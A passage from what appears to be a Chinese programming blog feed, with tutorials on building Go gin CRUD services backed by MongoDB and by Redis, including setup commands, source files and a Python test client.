c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;编辑成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserDelete</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		err := user.Delete()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;删除失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;删除成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserQuery</span><span class="params">(c *gin.Context, key <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	user := models.User&#123;</span><br><span class="line">		Key: key,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		user, err := user.Query()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;查询成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: user,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>routers/router.go</code> 路由层，调用api层的代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/studyMongoDb/api&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span></span> *gin.Engine &#123;</span><br><span class="line"></span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.POST(<span class="string">&quot;/UserAdd&quot;</span>, api.UserAdd)</span><br><span class="line">	router.GET(<span class="string">&quot;/UserList&quot;</span>, api.UserList)</span><br><span class="line">	router.POST(<span class="string">&quot;/UserEditOne&quot;</span>, api.UserEditOne)</span><br><span class="line">	router.POST(<span class="string">&quot;/UserDelete&quot;</span>, api.UserDelete)</span><br><span class="line">	router.GET(<span class="string">&quot;/UserQuery/:key&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		key := c.Param(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">		api.UserQuery(c, key)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> router</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>main.go</code> 代码入口</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/studyMongoDb/dbs&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/studyMongoDb/routers&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	dbs.ConnectToDB(<span class="string">&quot;mongodb://admin:123456@localhost:27017&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">	router := routers.InitRouter()</span><br><span class="line">	router.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">	<span class="comment">// 优雅关闭连接</span></span><br><span class="line">	<span class="keyword">defer</span> dbs.Client.Disconnect(context.TODO())</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行<code>main.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyMongoDb&gt; <span class="keyword">go</span> run .\main.<span class="keyword">go</span></span><br><span class="line">[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.</span><br><span class="line"></span><br><span class="line">[GIN-debug] [WARNING] Running in <span class="string">&quot;debug&quot;</span> mode. Switch to <span class="string">&quot;release&quot;</span> mode in production.</span><br><span class="line"> - using env:   export GIN_MODE=release</span><br><span class="line"> - using code:  gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /UserAdd                  --&gt; example.com/studyMongoDb/api.UserAdd (<span class="number">3</span> handlers) </span><br><span class="line">[GIN-debug] GET    /UserList                 --&gt; example.com/studyMongoDb/api.UserList (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] POST   /UserEditOne              --&gt; example.com/studyMongoDb/api.UserEditOne (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] POST   /UserDelete               --&gt; example.com/studyMongoDb/api.UserDelete (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] GET    /UserQuery/:key           --&gt; example.com/studyMongoDb/routers.InitRouter.func1 (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https:<span class="comment">//pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span></span><br><span class="line">[GIN-debug] Listening and serving HTTP on :<span class="number">8000</span></span><br></pre></td></tr></table></figure>

<h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><ul>
<li>测试的客户端代码，使用python</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test111&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1123456&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key2&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/UserAdd&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test1131&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456811&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">1112</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key1&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/UserEditOne&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">data =&#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key1&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/UserDelete&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8000/UserQuery/t_key2/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8000/UserList&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>go操作redis</title>
    <url>/aposts/c5af2022/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次主要时在windows下，利用go 操作redis</p>
<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
<li>Redis（Remote Dictionary Server )，即远程字典服务，它是一个开源的，使用ANSI C语言编写、遵守BSD协议、支持网络、可<strong>基于内存</strong>亦可持久化的日志型、<strong>Key-Value数据库</strong>，并提供多种语言的API。Redis 默认端口为 6379，是一个NoSQL数据库</li>
</ul>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li>打开<a href="https://github.com/MicrosoftArchive/redis/releases">地址</a>下载安装包并安装，安装成功后在环境变量中可以看到，安装目录已经加入到了PATH中</li>
</ul>
<h3 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h3><ul>
<li>执行命令启动服务端</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\Redis&gt;redis-server.exe redis.windows.conf</span><br><span class="line">[6436] 10 Jul 17:44:10.177 # Creating Server TCP listening socket *:6379: bind: No error</span><br></pre></td></tr></table></figure>

<ul>
<li>查看服务端口是否正常</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\Redis&gt;netstat -an | findstr &quot;6379&quot;</span><br><span class="line">  TCP    0.0.0.0:6379           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    [::]:6379              [::]:0                 LISTENING</span><br></pre></td></tr></table></figure>

<h3 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h3><p>打开redis目录中的<code>redis.windows.conf</code></p>
<ul>
<li>配置Redis的设置最大占用内存，设置maxmemory参数，maxmemory是字节字节类型，如果不设置maxmemory或者设置为0,64位系统不限制内存，32位系统最多使用3GB内存。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># maxmemory &lt;bytes&gt;</span><br><span class="line"># 设置最大的内存为1G</span><br><span class="line">maxmemory 1000000000</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\Redis&gt;redis-cli.exe -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>

<ul>
<li>进行set和get操作</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set username hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get username</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">127.0.0.1:6379&gt;SCAN 0 MATCH *  // 查询所有key</span><br><span class="line">127.0.0.1:6379&gt; FLUSHDB   //删除所有Key</span><br><span class="line">127.0.0.1:6379&gt; keys *  // 查询所有key</span><br><span class="line">1) &quot;cache:user:id:23&quot;</span><br><span class="line">127.0.0.1:6379&gt; del &quot;cache:user:id:admin&quot; // 删除指定key</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><ul>
<li><p>使用gin框架</p>
</li>
<li><p>自定义Person结构体</p>
</li>
<li><p>实现对Person的增删改查。</p>
</li>
<li><p>根据id查询或查询所有、插入、修改、删除</p>
</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul>
<li>先安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go get -u github.com/gin-gonic/gin</span><br><span class="line">go get github.com/redis/go-redis/v9</span><br></pre></td></tr></table></figure>

<ul>
<li>新建并初始化项目</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd E:\proj\gowork</span><br><span class="line">mkdir studyGin</span><br><span class="line">cd studyGin</span><br><span class="line">go mod init example.com/goRedis</span><br></pre></td></tr></table></figure>

<ul>
<li>用vscode ide编写代码</li>
<li><code>db\dbs.go</code>  主要存放连接redis的代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/redis/go-redis/v9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Rdbs *redis.Client</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRedis</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">	rd := redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">		Addr:     <span class="string">&quot;localhost:6379&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;&quot;</span>,</span><br><span class="line">		DB:       <span class="number">0</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	Rdbs = rd</span><br><span class="line">	<span class="comment">//清空当前数据库中的所有key，只要加了这个每次重新启动服务器，所有数据被清空</span></span><br><span class="line">	<span class="comment">// Rdbs.FlushDB(ctx)</span></span><br><span class="line">	_, err := Rdbs.Ping(ctx).Result() <span class="comment">// PING, &lt;nil&gt;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;connect redis failed:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Close</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Rdbs.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>model\users.go</code>  操作user的实体类，如曾删改查</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/goRedis/db&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Key      <span class="type">string</span> <span class="string">`json:&quot;key&quot;`</span></span><br><span class="line">	Name     <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	Id       <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储和读取redis时，不能直接存入结构体，必须进行序列号和反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> MarshalBinary() (data []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> json.Marshal(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> UnmarshalBinary(data []<span class="type">byte</span>) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> json.Unmarshal(data, u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> Add(ctx *context.Context) (err <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// HMSet 批量设置 map[string]interface&#123;&#125;&#123;&quot;name&quot;: &quot;张&quot;, &quot;password&quot;: &quot;11111&quot;, &quot;id&quot;: 123&#125;</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;json.=&quot;</span>, u)</span><br><span class="line">	<span class="comment">// 必须转为[]byte, redis不支持直接存结构体</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 0 表示key永不过期</span></span><br><span class="line">	_, err = db.Rdbs.Set(*ctx, u.Key, u, <span class="number">0</span>).Result()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;db.Rdbs.Set,&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据key 获取到数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> GetUser(ctx *context.Context) (user1 User, err <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	err = db.Rdbs.Get(*ctx, u.Key).Scan(u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;GetUser error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	user1 = *u</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> QueryAll(ctx *context.Context) (user1 []User, er <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// keys, err := db.Rdbs.Keys(*ctx, &quot;[1-9]*&quot;)).Result()</span></span><br><span class="line">	keys, err := db.Rdbs.Keys(*ctx, <span class="string">&quot;*&quot;</span>).Result()</span><br><span class="line">	fmt.Println(<span class="string">&quot;key=&quot;</span>, keys)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;db.Rdbs.Keys error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">		err = db.Rdbs.Get(*ctx, key).Scan(u)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;Rdbs.Get error&quot;</span>, err)</span><br><span class="line">			fmt.Println(<span class="string">&quot;key=&quot;</span>, key)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;query=&quot;</span>, *u)</span><br><span class="line">		user1 = <span class="built_in">append</span>(user1, *u)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> DeleteUser(ctx *context.Context) (err <span class="type">bool</span>) &#123;</span><br><span class="line">	<span class="comment">// 先判断key是否存在</span></span><br><span class="line">	<span class="keyword">if</span> db.Rdbs.Exists(*ctx, u.Key).Val() == <span class="number">1</span> &#123;</span><br><span class="line">		_, er := db.Rdbs.Del(*ctx, u.Key).Result()</span><br><span class="line">		<span class="keyword">if</span> er != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;DeleteUser error: &quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> UpdateUser(ctx *context.Context) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 先判断key是否存在</span></span><br><span class="line">	<span class="keyword">if</span> db.Rdbs.Exists(*ctx, u.Key).Val() == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="comment">// 必须转为[]byte, redis不支持直接存结构体</span></span><br><span class="line">		u1, _ := json.Marshal(u)</span><br><span class="line">		_, err = db.Rdbs.Set(*ctx, u.Key, u1, <span class="number">0</span>).Result()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;UpdateUser error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>api/users.go</code>  调用model层代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> api</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/goRedis/models&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserAdd</span><span class="params">(c *gin.Context, ctx *context.Context)</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;add=&quot;</span>, c)</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123; <span class="comment">//把客户端格式传过来的数据绑定到结构体user中去</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;data=&quot;</span>, user)</span><br><span class="line">		err := user.Add(ctx) <span class="comment">// 调用model层的对应方法</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;新增失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;新增成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserGet</span><span class="params">(c *gin.Context, ctx *context.Context, key <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 接受key</span></span><br><span class="line">	users := models.User&#123;</span><br><span class="line">		Key: key,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;users) == <span class="literal">nil</span> &#123;</span><br><span class="line">		users, err := users.GetUser(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;获取失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: users,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;获取成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: users,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserAll</span><span class="params">(c *gin.Context, ctx *context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		users, err := user.QueryAll(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;获取失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: users,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;获取成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: users,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserDel</span><span class="params">(c *gin.Context, ctx *context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		err := user.DeleteUser(ctx)</span><br><span class="line">		fmt.Println(<span class="string">&quot;del=&quot;</span>, err)</span><br><span class="line">		<span class="keyword">if</span> !err &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;删除失败1&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span 